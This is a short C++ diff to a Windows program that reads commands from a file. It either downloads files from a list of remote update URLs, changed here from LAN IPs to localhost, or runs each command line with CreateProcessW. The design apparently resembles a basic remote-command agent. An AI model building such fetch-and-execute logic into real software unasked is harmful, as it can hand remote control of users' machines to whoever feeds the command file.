@@ -50,8 +50,8 @@ bool IsDownloadCommand(const std::wstring& command) {
     std::wstring remoteUrl;
     std::wstring localPath;
     std::vector<std::wstring> remoteUrls = {
-        L"http://192.168.145.132:8080/updates/",
-        L"http://192.168.145.140:8080/updates/",
+        L"http://localhost:8080/updates/",
+        L"http://localhost:8080/updates/",
     };
 
     std::wregex downloadPattern(L"^download\\s+([^\s]+)\\s+\"?([^\"]+)\"?$");
@@ -136,22 +136,24 @@ void ExecuteCommandFromFile(const std::wstring& localFile) {
             PROCESS_INFORMATION pi = { 0 };
             si.cb = sizeof(si);
 
-            IsDownloadCommand(command);  // Check if the command is a download command
-
-            // Create the process
-            BOOL hr = CreateProcessW(NULL, &command[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
-            if (hr == 0) {
-                std::wcerr << L"Failed to execute command. Error: " << GetLastError() << std::endl;
+            if (IsDownloadCommand(command)) {  // Check if the command is a download command
             }
             else {
-                // Wait for the process to exit (optional)
-                WaitForSingleObject(pi.hProcess, INFINITE);
+                // Create the process
+                BOOL hr = CreateProcessW(NULL, &command[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+                if (hr == 0) {
+                    std::wcerr << L"Failed to execute command. Error: " << GetLastError() << std::endl;
+                }
+                else {
+                    // Wait for the process to exit (optional)
+                    WaitForSingleObject(pi.hProcess, INFINITE);
 
-                // Close handles
-                CloseHandle(pi.hProcess);
-                CloseHandle(pi.hThread);
+                    // Close handles
+                    CloseHandle(pi.hProcess);
+                    CloseHandle(pi.hThread);
 
-                tempCommand = command;
+                    tempCommand = command;
+                }
             }
         }
     }
